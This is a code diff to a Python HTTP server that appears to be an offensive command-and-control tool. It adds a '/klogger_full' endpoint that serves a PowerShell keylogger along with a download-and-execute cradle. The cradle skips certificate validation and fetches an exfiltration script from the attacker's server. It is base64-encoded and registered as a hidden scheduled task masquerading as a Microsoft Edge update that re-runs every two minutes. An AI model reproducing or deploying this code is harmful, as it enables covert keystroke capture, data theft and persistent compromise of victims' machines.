@@ -110,7 +110,29 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.wfile.write(bytes(file_to_open, 'utf-8'))
                 log('[+] File client_logger_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
             except:
+                log('[-] File client_logger_exf.ps1 does not exist.',print_console=True,trace_time=True)
+                self.send_response(404)
+                self.wfile.write(b'Not Found')
+        elif self.path == '/klogger_full':
+            try:
+                file_to_open = open('scripts/client_logger.ps1','r').read()
+                file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
+                klogger_full_payload = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$w=(New-Object Net.WebClient);IEX $w.DownloadString('SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/klogger_exf');"
+                klogger_full_payload = klogger_full_payload.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
+                klogger_full_payload = klogger_full_payload.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
+                klogger_full_payload = klogger_full_payload.replace('SERVER_PROTOCOL',PROTOCOL)
+                klogger_full_payload_encoded = encode_to_base64_utf16_le(klogger_full_payload)
+                klogger_full_TASK = '$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -windowstyle hidden -e BASE64_ENCODED_PAYLOAD_UTF16LE";$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(60) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Hours 4380);$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings (New-ScheduledTaskSettingsSet);Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineKernel" -InputObject $Task -Force;'
+                klogger_full_TASK = klogger_full_TASK.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',klogger_full_payload_encoded.decode('utf-8'))
+                self.send_response(200)
+                self.send_header('Content-type', 'text')
+                self.end_headers()
+                self.wfile.write(bytes(klogger_full_TASK, 'utf-8')+bytes(file_to_open, 'utf-8'))
+                log('[+] File client_logger.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+                log('[+] Sent a new scheduled task to retrieve klogger file every 2 minutes (MicrosoftEdgeUpdateTaskMachineKernel)!',print_console=True,trace_time=True)
+            except Exception as e:
                 log('[-] File client_logger.ps1 does not exist.',print_console=True,trace_time=True)
+                print(str(e))
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
         elif self.path == '/rvs':
@@ -270,7 +292,7 @@ def encode_to_base64_utf16_le(input_string):
     except Exception as e:
         print(f"Error while encoding : {e}")
         return None
-        
+
 #Loggin function of events in the current folder
 #To print the logs in console output, set log(Text,True)
 def log(text,print_console=False,trace_time=True):
